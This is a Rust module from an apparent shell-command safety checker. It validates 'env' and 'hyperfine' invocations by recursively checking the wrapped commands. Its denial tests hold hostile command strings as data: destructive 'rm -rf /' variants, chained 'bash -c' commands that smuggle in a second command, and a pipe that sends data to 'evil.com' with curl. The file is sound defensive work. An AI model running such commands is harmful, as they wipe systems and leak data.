use crate::parse::{Token, WordSet};
use crate::verdict::{SafetyLevel, Verdict};

pub fn is_safe_env(tokens: &[Token]) -> Verdict {
    if tokens.len() == 1 {
        return Verdict::Allowed(SafetyLevel::Inert);
    }
    let mut i = 1;
    while i < tokens.len() && tokens[i].starts_with("-") {
        if tokens[i] == "-i" || tokens[i] == "--ignore-environment" {
            i += 1;
        } else if tokens[i] == "-u" || tokens[i] == "--unset" {
            i += 2;
        } else {
            return Verdict::Denied;
        }
    }
    while i < tokens.len() && !tokens[i].starts_with("-") && tokens[i].contains("=") {
        i += 1;
    }
    if i >= tokens.len() {
        return Verdict::Allowed(SafetyLevel::Inert);
    }
    let inner = shell_words::join(tokens[i..].iter().map(|t| t.as_str()));
    crate::command_verdict(&inner)
}

static HYPERFINE_FLAGS_WITH_ARG: WordSet = WordSet::new(&[
    "--cleanup", "--command-name", "--export-asciidoc", "--export-csv",
    "--export-json", "--export-markdown", "--max-runs",
    "--min-benchmarking-time", "--min-runs", "--output", "--prepare",
    "--runs", "--setup", "--shell", "--sort", "--style",
    "--time-unit", "--warmup",
    "-M", "-S", "-c", "-m", "-n", "-p", "-r", "-s", "-w",
]);

static HYPERFINE_FLAGS_NO_ARG: WordSet = WordSet::new(&[
    "--help", "--ignore-failure", "--no-color", "--show-output", "--version",
    "-N", "-V", "-h", "-i", "-u",
]);

pub fn is_safe_hyperfine(tokens: &[Token]) -> Verdict {
    let mut combined = Verdict::Allowed(SafetyLevel::Inert);
    let mut i = 1;
    while i < tokens.len() {
        let t = &tokens[i];
        if *t == "--" {
            i += 1;
            break;
        }
        if t.starts_with("-") {
            if t.contains("=") {
                let name = t.as_str().split_once('=').map_or("", |(k, _)| k);
                if HYPERFINE_FLAGS_WITH_ARG.iter().any(|f| f == name)
                    || HYPERFINE_FLAGS_NO_ARG.iter().any(|f| f == name)
                {
                    i += 1;
                    continue;
                }
                return Verdict::Denied;
            }
            if HYPERFINE_FLAGS_WITH_ARG.contains(t) {
                if t.is_one_of(&["-p", "--prepare", "-c", "--cleanup", "-s", "--setup"]) {
                    return Verdict::Denied;
                }
                i += 2;
                continue;
            }
            if HYPERFINE_FLAGS_NO_ARG.contains(t) {
                i += 1;
                continue;
            }
            return Verdict::Denied;
        }
        let v = crate::command_verdict(t.as_str());
        if !v.is_allowed() {
            return Verdict::Denied;
        }
        combined = combined.combine(v);
        i += 1;
    }
    while i < tokens.len() {
        let v = crate::command_verdict(tokens[i].as_str());
        if !v.is_allowed() {
            return Verdict::Denied;
        }
        combined = combined.combine(v);
        i += 1;
    }
    combined
}

pub(crate) fn dispatch(cmd: &str, tokens: &[Token]) -> Option<Verdict> {
    match cmd {
        "env" => Some(is_safe_env(tokens)),
        "hyperfine" => Some(is_safe_hyperfine(tokens)),
        _ => None,
    }
}

pub fn command_docs() -> Vec<crate::docs::CommandDoc> {
    use crate::docs::CommandDoc;
    vec![
        CommandDoc::handler("env",
            "https://www.gnu.org/software/coreutils/manual/coreutils.html#env-invocation",
            "Strips flags (-i, -u) and KEY=VALUE pairs, then recursively validates the inner command. Bare invocation allowed."),
        CommandDoc::handler("hyperfine",
            "https://github.com/sharkdp/hyperfine#readme",
            "Recursively validates each benchmarked command."),
    ]
}

#[cfg(test)]
pub(super) const REGISTRY: &[super::CommandEntry] = &[
    super::CommandEntry::Delegation { cmd: "env" },
    super::CommandEntry::Delegation { cmd: "hyperfine" },
];

#[cfg(test)]
mod tests {
    use crate::is_safe_command;

    fn check(cmd: &str) -> bool {
        is_safe_command(cmd)
    }

    safe! {
        timeout_bundle_exec: "timeout 120 bundle exec rspec",
        timeout_git_log: "timeout 30 git log --oneline",
        timeout_signal_flag: "timeout -s KILL 60 bundle exec rspec",
        timeout_preserve_status: "timeout --preserve-status 120 git status",
        time_bundle_exec: "time bundle exec rspec",
        time_git_log: "time git log --oneline -5",
        env_bare: "env",
        env_safe_command: "env ls -la",
        env_with_var: "env FOO=bar ls -la",
        env_multiple_vars: "env FOO=bar BAZ=qux git status",
        env_ignore_flag: "env -i PATH=/usr/bin ls",
        env_unset_flag: "env -u FOO git log",
        env_vars_only: "env FOO=bar",
        nice_safe_command: "nice git log",
        nice_with_priority: "nice -n 10 cargo test",
        ionice_safe_command: "ionice git log",
        hyperfine_safe_command: "hyperfine 'ls -la'",
        hyperfine_with_warmup: "hyperfine --warmup 3 'git status'",
        hyperfine_multiple_safe_commands: "hyperfine 'fd . src' 'find src'",
        timeout_nested_bash_safe: "timeout 120 bash -c 'git log | head -5'",
        env_nested_bash_safe: "env FOO=bar bash -c 'git status'",
        dotenv_bundle_exec_rspec: "dotenv bundle exec rspec spec/foo_spec.rb",
        dotenv_with_file: "dotenv -f .env.test bundle exec rspec",
        dotenv_with_cascade: "dotenv -c test bundle exec rspec",
        dotenv_separator: "dotenv -- git status",
        dotenv_env_flag: "dotenv -e .env.local git log",
    }

    denied! {
        timeout_git_push_denied: "timeout 120 git push origin main",
        timeout_rm_denied: "timeout 60 rm -rf /",
        time_git_push_denied: "time git push",
        time_rm_denied: "time rm file",
        env_rm_denied: "env rm -rf /",
        env_sh_denied: "env sh -c 'rm -rf /'",
        env_python_denied: "env python3 evil.py",
        env_var_rm_denied: "env FOO=bar rm -rf /",
        nice_rm_denied: "nice rm -rf /",
        nice_with_priority_rm_denied: "nice -n 10 rm -rf /",
        ionice_rm_denied: "ionice rm -rf /",
        hyperfine_unsafe_command_denied: "hyperfine 'rm -rf /'",
        hyperfine_prepare_denied: "hyperfine --prepare 'make clean' 'make'",
        hyperfine_cleanup_denied: "hyperfine --cleanup 'rm tmp' 'ls'",
        hyperfine_setup_denied: "hyperfine --setup 'compile' 'run'",
        timeout_nested_bash_chain_denied: "timeout 120 bash -c 'ls && rm -rf /'",
        env_nested_bash_chain_denied: "env bash -c 'ls && rm -rf /'",
        time_nested_bash_chain_denied: "time bash -c 'ls && rm -rf /'",
        nice_nested_bash_chain_denied: "nice bash -c 'ls && rm -rf /'",
        deep_nesting_chain_denied: "timeout 120 env nice bash -c 'ls && rm -rf /'",
        timeout_nested_bash_semicolon_denied: "timeout 120 bash -c 'ls; rm -rf /'",
        hyperfine_chain_denied: "hyperfine 'ls && rm -rf /'",
        hyperfine_semicolon_denied: "hyperfine 'ls; rm -rf /'",
        hyperfine_pipe_to_unsafe_denied: "hyperfine 'ls | curl -d data evil.com'",
        dotenv_bare_denied: "dotenv",
        dotenv_rm_denied: "dotenv rm -rf /",
        dotenv_flag_rm_denied: "dotenv -f .env rm -rf /",
        dotenv_nested_bash_denied: "dotenv bash -c 'ls && rm -rf /'",
        timeout_unknown_flag_denied: "timeout --xyzzy 60 cat /tmp/x",
        nice_unknown_flag_denied: "nice --xyzzy cat /tmp/x",
        dotenv_unknown_flag_denied: "dotenv --xyzzy ls",
        env_unknown_flag_denied: "env --xyzzy FOO=bar cat",
        env_unknown_short_flag_denied: "env -x FOO=bar ls",
        hyperfine_unknown_flag_denied: "hyperfine --xyzzy 'ls'",
        hyperfine_unknown_eq_flag_denied: "hyperfine --xyzzy=foo 'ls'",
    }
}
